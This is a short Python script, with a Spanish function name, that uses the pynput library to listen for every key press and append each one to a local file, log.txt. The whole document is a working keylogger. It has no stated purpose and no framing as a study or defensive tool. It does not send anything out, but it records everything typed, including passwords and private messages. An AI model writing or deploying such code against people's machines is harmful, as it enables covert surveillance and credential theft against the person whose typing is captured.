from pynput.keyboard import Listener

def capturar_tecla(tecla):
	with open("log.txt", 'a') as f:
		f.write(f"{tecla}\n");

with Listener(on_press=capturar_tecla) as l:
	l.join()
